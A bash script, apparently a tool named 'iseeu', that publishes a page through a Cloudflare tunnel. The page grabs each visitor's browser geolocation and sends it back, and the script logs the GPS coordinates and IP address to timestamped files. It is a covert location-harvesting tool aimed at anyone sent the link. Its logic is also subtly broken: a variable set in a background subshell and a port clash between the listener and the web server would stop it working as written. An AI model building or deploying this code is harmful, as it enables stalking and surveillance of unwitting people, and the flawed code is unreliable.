#!/bin/bash

clear

read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TMP_CF_LOG="/tmp/cf_output.log"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null
rm -f "$TMP_CF_LOG"

mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
cd "$WEB_DIR" || exit 1

echo "[*] Creating minimal HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head><title>I See You</title>
<script>
  function redirectToMap(position) {
    fetch('/logme/' + position.coords.latitude + ',' + position.coords.longitude);
    document.body.innerHTML = '<h1>Thanks</h1>';
  }
  function fail() {
    alert("Location blocked");
  }
  navigator.geolocation.getCurrentPosition(redirectToMap, fail);
</script>
</head>
<body><h1>Loading...</h1></body>
</html>
EOF

echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

echo "[*] Starting Cloudflared tunnel..."
URL=""
cloudflared tunnel --url "http://localhost:$PORT" 2>&1 | tee "$TMP_CF_LOG" | while read -r line; do
  echo "$line"
  if [[ "$line" =~ https://.*\.trycloudflare\.com ]]; then
    URL=$(echo "$line" | grep -oE "https://.*\.trycloudflare\.com")
    echo "[✓] Public URL: $URL"
    echo "[*] Logging to $LOG_FILE..."
    break
  fi
done &

# Wait up to 15s for URL
for i in {1..15}; do
  sleep 1
  [[ -n "$URL" ]] && break
done

if [[ -z "$URL" ]]; then
  echo "[✗] Failed to get public URL."
  kill "$SERVER_PID"
  pkill -f cloudflared
  exit 1
fi

# Start lightweight listener to log GPS info
(
while true; do
  nc -l -p "$PORT" | while read -r line; do
    if [[ "$line" == *"/logme/"* ]]; then
      GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
      IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
      echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
    fi
  done
done
) &

# Cleanup trap
trap 'echo "[*] Cleaning up..."; kill "$SERVER_PID"; pkill -f cloudflared; rm -f "$TMP_CF_LOG"; echo "[*] Done."' INT

echo "[*] Press Ctrl+C to stop."
wait